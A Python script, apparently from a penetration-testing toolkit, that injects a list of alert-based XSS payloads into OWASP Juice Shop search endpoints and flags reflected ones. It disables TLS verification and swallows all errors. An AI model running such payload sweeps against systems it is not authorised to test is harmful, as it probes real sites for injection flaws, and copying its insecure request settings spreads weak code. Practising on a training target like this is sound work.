import requests
import urllib3
urllib3.disable_warnings()

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "\"><img src=x onerror=alert(1)>",
    "<script>alert(document.cookie)</script>",
    "<svg/onload=alert(1)>",
]

JUICE_SHOP_ENDPOINTS = [
    "/rest/products/search?q=",
    "/#/search?q=",
    "/api/Products?q=",
]

REFLECTION_SIGNATURES = [
    "<script>alert",
    "<img src=x onerror",
    "<svg onload",
    "<svg/onload",
    "onerror=alert",
]

def run(target):
    if not target.startswith("http"):
        target = "http://" + target

    target = target.rstrip("/")

    print(f"    [*] Target: {target}")
    print(f"    [*] Testing {len(XSS_PAYLOADS)} payloads on {len(JUICE_SHOP_ENDPOINTS)} endpoints...\n")

    found = []

    for endpoint in JUICE_SHOP_ENDPOINTS:
        for payload in XSS_PAYLOADS:
            url = f"{target}{endpoint}{requests.utils.quote(payload)}"
            try:
                r = requests.get(url, timeout=5, verify=False)
                body = r.text

                # Check reflected payload
                for sig in REFLECTION_SIGNATURES:
                    if sig.lower() in body.lower():
                        result = {
                            "url": url,
                            "payload": payload,
                            "type": "Reflected XSS",
                            "endpoint": endpoint
                        }
                        print(f"    \033[92m[+] XSS Found!\033[0m")
                        print(f"        URL: {url}")
                        print(f"        Payload: {payload}")
                        print(f"        Type: Reflected XSS\n")
                        found.append(result)
                        break

                # Check error-based reflection (payload in JSON error)
                if payload in body and r.status_code in [400, 500]:
                    result = {
                        "url": url,
                        "payload": payload,
                        "type": "Error-based Reflection",
                        "endpoint": endpoint
                    }
                    print(f"    \033[93m[+] Possible XSS (Error Reflection)!\033[0m")
                    print(f"        URL: {url}")
                    print(f"        Payload: {payload}\n")
                    if result not in found:
                        found.append(result)

            except:
                pass

    if not found:
        print("    [-] No XSS vulnerabilities detected")

    return found
